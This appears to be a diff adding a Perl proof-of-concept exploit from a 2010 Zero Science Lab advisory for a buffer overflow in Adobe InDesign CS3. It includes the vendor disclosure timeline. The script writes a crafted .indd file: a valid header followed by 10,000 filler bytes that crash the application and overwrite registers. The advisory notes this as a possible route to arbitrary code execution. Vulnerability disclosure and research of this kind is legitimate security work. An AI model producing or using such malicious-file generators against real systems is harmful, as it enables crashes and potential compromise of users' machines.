@@ -1,0 +1,73 @@
+#!/usr/bin/perl
+#
+# Adobe InDesign CS3 INDD File Handling Buffer Overflow Vulnerability
+#
+# Vendor: Adobe Systems Inc.
+#
+# Product Web Page: http://www.adobe.com
+#
+# Version tested: CS3 10.0
+#
+# Summary: Adobe® InDesign® CS3 software provides precise control over
+# typography and built-in creative tools for designing, preflighting,
+# and publishing documents for print, online, or to mobile devices. Include
+# interactivity, animation, video, and sound in page layouts to fully engage
+# readers.
+#
+# Desc: When parsing .indd files to the application, it crashes instantly
+# overwriting memory registers. Depending on the offset, EBP, EDI, EDX and
+# ESI gets overwritten. Pottential vulnerability use is arbitrary code execution
+# and denial of service.
+#
+#
+# Tested on Microsoft Windows XP Professional SP3 (English)
+#
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#
+# liquidworm gmail com
+#
+# Zero Science Lab - http://www.zeroscience.mk
+#
+# 16.09.2009
+#
+#
+#
+# Vendor status:
+#
+# [16.09.2009] Vulnerability discovered.
+# [09.03.2010] Vulnerability reported to vendor with sent PoC files.
+# [21.03.2010] Asked confirmation from the vendor.
+# [21.03.2010] Vendor asked for PoC files due to communication errors.
+# [22.03.2010] Re-sent PoC files to vendor.
+# [04.04.2010] Vendor confirms vulnerability.
+# [03.06.2010] Vendor informs that they discontinued support for CS3 since CS5 is out.
+# [04.06.2010] Public advisory released.
+#
+#
+# Zero Science Lab Advisory ID: ZSL-2010-4941
+# Advisory: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4941.php
+#
+#
+#
+# Raw PoC code:
+#
+
+$header = "\x06\x06\xED\xF5\xD8\x1D\x46\xE5\xBD\x31\xEF\xE7\xFE\x74\xB7\x1D\x44\x4F\x43\x55\x4D\x45\x4E\x54\x01";
+
+$fn = "teppei.indd";
+
+$bof = "\x41" x 10000;
+
+print "\n\n[*] Creating PoC file: $fn ...\r\n";
+
+sleep(1);
+
+open(indd, ">./$fn") || die "\n\aCannot open $fn : $!";
+
+print indd "$header" . "$bof";
+
+close (indd);
+
+print "\n[*] PoC file successfully created!\r\n";
